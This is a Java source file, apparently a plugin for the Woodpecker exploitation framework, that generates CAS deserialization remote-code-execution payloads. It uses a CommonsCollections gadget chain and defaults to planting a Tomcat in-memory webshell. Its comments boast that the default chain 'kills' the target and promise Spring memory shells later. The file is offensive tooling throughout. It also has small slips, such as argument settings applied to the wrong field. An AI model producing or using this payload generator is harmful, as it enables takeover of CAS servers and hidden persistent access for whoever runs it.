package me.gv7.woodpecker.plugin.payloads;

import me.gv7.woodpecker.plugin.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class CasPayloadGenerate implements IPayloadGenerator {
    public static IResultOutput iResultOutput;
    @Override
    public String getPayloadTabCaption() {
        return "CAS execute 反序列化生成器";
    }

    @Override
    public IArgsUsageBinder getPayloadCustomArgs() {
        IArgsUsageBinder binder = CasRCE.callbacks.getPluginHelper().createArgsUsageBinder();
        List<IArgs> args = new ArrayList<>();
        final IArgs gadge = CasRCE.callbacks.getPluginHelper().createArgs();
        gadge.setName("gadge");
        gadge.setDefaultValue("CommonsCollections4");
        gadge.setRequired(true);
        gadge.setDescription("cc链，默认用cc4就能打死");

        final IArgs shellType = CasRCE.callbacks.getPluginHelper().createArgs();
        shellType.setName("command");
        shellType.setDefaultValue("TomcatFilterWebshell");
        gadge.setRequired(true);
        gadge.setDescription("以后会添加spring的内存马");

        args.add(gadge);
        args.add(shellType);
        binder.setArgsList(args);
        binder.setUsage("gadge=URLDNS\nshell_type=http://www.baidu.com");
        return binder;
    }

    @Override
    public void generatorPayload(Map<String, String> customArgs, IResultOutput result) {
        iResultOutput = result;
        String className = customArgs.get("gadge");
        String command = customArgs.get("command");

        result.successPrintln(String.format("gadget: %s command: %s",className,command));
        result.rawPrintln("\n");
        result.rawPrintln(CasCommonUtils.generate(className, command));
        result.rawPrintln("\n");
    }
}
